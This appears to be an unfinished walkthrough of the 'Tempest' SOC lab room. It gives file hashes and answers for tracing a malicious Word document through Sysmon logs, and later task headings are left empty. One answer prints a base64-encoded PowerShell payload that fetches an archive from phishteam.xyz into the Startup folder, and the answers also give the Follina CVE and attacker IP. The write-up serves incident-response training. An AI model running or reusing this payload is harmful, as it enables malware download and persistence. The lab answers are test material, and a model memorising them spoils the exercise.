# Tempest

## Introduction

This room is a capstone challenge for the SOC 1 learning path. 

### Task 3: Preparation - Tools and Artifacts
This task asks us to find the SHA256 hashes of the incident files. This is done with the Powershell command `Get-FileHash`

<img width="835" height="272" alt="image" src="https://github.com/user-attachments/assets/280cbf90-41fa-4ae0-b175-51f4a5d1a954" />

#### Task 3 Questions:
**What is the SHA256 hash of the capture.pcapng file?**
> CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6

**What is the SHA256 hash of the sysmon.evtx file?**
> 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F

**What is the SHA256 hash of the windows.evtx file?**
> D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

### Task 4: Initial Access - Malicious Document
We are investigating a CRITICAL severity alert. The analyst who escalated this alert has gathered some information for us:
- The malicious document has a .doc extension.
- The user downloaded the malicious document via chrome.exe.
- The malicious document then executed a chain of commands to attain code execution.

Additionally, the tasks has some notes for us:
- Start with the events generated by Sysmon.
- EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.
- Follow the child processes of WinWord.exe.
- Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
- We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS Queries (Event ID 22) to correlate the activity generated by the malicious document.

#### Task 4 Questions:
**The user of this machine was compromised by a malicious document. What is the file name of the document?**
> free_magicules.doc

Searching for file creation events (Event ID 11) and file stream creation events (Event ID 15) near the start of the logs, we can find the events where the malicious file was downloaded.

**What is the name of the compromised user and machine?**
*Format: username-machine name*
> benimaru-TEMPEST

We can find this as the User field in the download events

**What is the PID of the Microsoft Word process that opened the malicious document?**
> 496

Looking for Process Create events (Event ID 1) shortly after the download, we can see the first event after the download was in fact a Microsoft Word process, and we can confirm that it opened the malicious file in the Command Line field

<img width="1068" height="209" alt="image" src="https://github.com/user-attachments/assets/6e069d3d-913c-4301-b12b-92c5fc99d4a5" />


**Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?**
> 167.71.199.191

**What is the base64 encoded string in the malicious payload executed by the document?**
> JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==

**What is the CVE number of the exploit used by the attacker to achieve a remote code execution?**
*Format: XXXX-XXXXX*
> 2022-30190

### Task 5: Initial Access - Stage 2 execution
#### Task 5 Questions:
### Task 6: Initial Access - Malicious Document Traffic
#### Task 6 Questions:
### Task 7: Discovery - Internal Reconnaissance
#### Task 7 Questions:
### Task 8: Privilege Escalation - Exploiting Privileges
#### Task 8 Questions:
### Task 9: Actions on Objective - Fully-owned Machine
#### Task 9 Questions:







## Conclusion and Learning Outcomes
